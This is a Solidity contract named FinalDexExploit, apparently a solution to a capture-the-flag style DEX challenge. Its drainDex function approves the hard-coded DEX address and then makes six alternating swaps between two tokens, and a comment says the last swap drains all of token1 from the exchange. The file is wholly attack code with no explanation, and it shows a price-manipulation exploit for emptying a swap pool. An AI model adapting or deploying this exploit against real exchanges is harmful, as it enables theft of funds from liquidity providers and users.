// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract FinalDexExploit {
    address private constant DEX = 0xa16E02E87b7454126E5E10d957A927A7F5B5d2be;
    address private constant TOKEN1 = 0xB7A5bd0345EF1Cc5E66bf61BdeC17D2461fBd968;
    address private constant TOKEN2 = 0xeEBe00Ac0756308ac4AaBfD76c05c4F3088B8883;
    
    function drainDex() external {
        // Call approve on the DEX contract to approve itself
        (bool success1, ) = DEX.call(abi.encodeWithSignature("approve(address,uint256)", DEX, type(uint256).max));
        require(success1, "Approve failed");
        
        // Swap 1: 10 token1 -> token2
        (bool success2, ) = DEX.call(abi.encodeWithSignature("swap(address,address,uint256)", TOKEN1, TOKEN2, 10));
        require(success2, "Swap 1 failed");
        
        // Swap 2: 20 token2 -> token1  
        (bool success3, ) = DEX.call(abi.encodeWithSignature("swap(address,address,uint256)", TOKEN2, TOKEN1, 20));
        require(success3, "Swap 2 failed");
        
        // Swap 3: 24 token1 -> token2
        (bool success4, ) = DEX.call(abi.encodeWithSignature("swap(address,address,uint256)", TOKEN1, TOKEN2, 24));
        require(success4, "Swap 3 failed");
        
        // Swap 4: 30 token2 -> token1
        (bool success5, ) = DEX.call(abi.encodeWithSignature("swap(address,address,uint256)", TOKEN2, TOKEN1, 30));
        require(success5, "Swap 4 failed");
        
        // Swap 5: 41 token1 -> token2
        (bool success6, ) = DEX.call(abi.encodeWithSignature("swap(address,address,uint256)", TOKEN1, TOKEN2, 41));
        require(success6, "Swap 5 failed");
        
        // Swap 6: 45 token2 -> token1 (this will drain all token1 from DEX)
        (bool success7, ) = DEX.call(abi.encodeWithSignature("swap(address,address,uint256)", TOKEN2, TOKEN1, 45));
        require(success7, "Swap 6 failed");
    }
}